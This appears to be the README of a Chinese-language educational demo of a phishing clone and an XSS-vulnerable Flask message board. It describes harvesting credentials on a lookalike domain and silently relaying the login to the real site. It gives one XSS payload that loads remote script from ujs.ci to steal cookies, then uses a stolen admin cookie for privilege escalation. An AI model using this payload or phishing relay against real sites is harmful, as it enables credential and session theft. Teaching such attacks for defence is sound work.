# 钓鱼网站与XSS攻击演示项目

## 项目简介
本项目是一个基于Python 3.12和Flask框架开发的本地演示系统，旨在模拟钓鱼网站的攻击手法、原理以及XSS注入与越权访问的危害。

由于实际环境中，网站普遍采用HTTPS协议、复杂的Cookie验证机制以及人机验证等安全措施，使得通过POST提交表单实现中间人攻击和钓鱼的难度大大增加。因此，本项目在本地环境搭建，采用明文传输方式，以便更直观地展示相关攻击原理。

## 项目结构
项目包含两个主要部分：
- 正常网站：运行在 http://example.com:5000
- 钓鱼网站：运行在 http://examp1e.com:5001（注意域名中是数字"1"而非字母"l"）

通过执行`start_servers.bat`可同时启动两个服务器。

## 功能说明
### 正常网站
1. **登录功能**：用户通过登录界面输入用户名和密码进行登录，系统验证通过后生成并设置认证令牌（auth_token）和用户名Cookie。
2. **主页展示**：登录成功后进入主页，显示用户信息（用户名、账户类型、上次登录时间等）。
3. **留言板功能**：
   - 已登录用户可在留言板发布留言。
   - 用户可编辑或删除自己发布的留言。
   - 留言数据存储在`messages.json`文件中。

### 钓鱼网站
钓鱼网站一比一复刻了正常网站的登录界面，唯一的区别在于用户提交的表单数据会发送到钓鱼网站的服务器，这是钓鱼网站的关键所在。

## 攻击演示

### 1. 钓鱼攻击实施
1. **诱导访问**：当用户被诱导访问域名相似的钓鱼网站（examp1e.com）时，如果不注意URL细节，很容易被蒙骗。
2. **信息窃取**：用户在钓鱼网站登录界面输入真实用户名和密码后，钓鱼网站会获取这些信息并存储在`data.txt`文件中。
3. **无缝跳转**：钓鱼网站会使用获取到的用户信息在真实网站上进行POST登录，然后将成功登录后的响应返回给用户，并将用户重定向到正常网站。用户后续操作不会察觉到异常，从而实现了信息窃取而不被发现。

### 2. XSS注入与越权访问
1. **XSS注入**：正常网站的留言板存在XSS注入漏洞。攻击者可在留言中插入恶意脚本（如`<sCRiPt/SrC=//ujs.ci/weo></script>`）。
2. **信息获取**：当其他用户（包括管理员）查看包含恶意脚本的留言时，脚本会执行，可获取用户的Cookie、IP地址、浏览器信息等隐私数据。
3. **越权访问**：一旦管理员的Cookie被获取，攻击者可使用Burpsuite等工具在请求数据包中添加管理员的Cookie信息。正常网站会误认为攻击者是管理员而允许访问，从而实现越权访问。

## 运行说明
1. 确保已安装Python 3.12及Flask框架。
2. 执行`start_servers.bat`启动正常网站和钓鱼网站。
3. 分别通过对应的域名访问两个网站进行演示。

## 注意事项
- 本项目仅用于教育和演示目的，旨在帮助理解网络安全威胁，请勿用于非法用途。
- 实际网络环境中，应采取多种安全措施保护个人信息和网站安全，如仔细核对URL、启用HTTPS、定期更新系统和软件等。
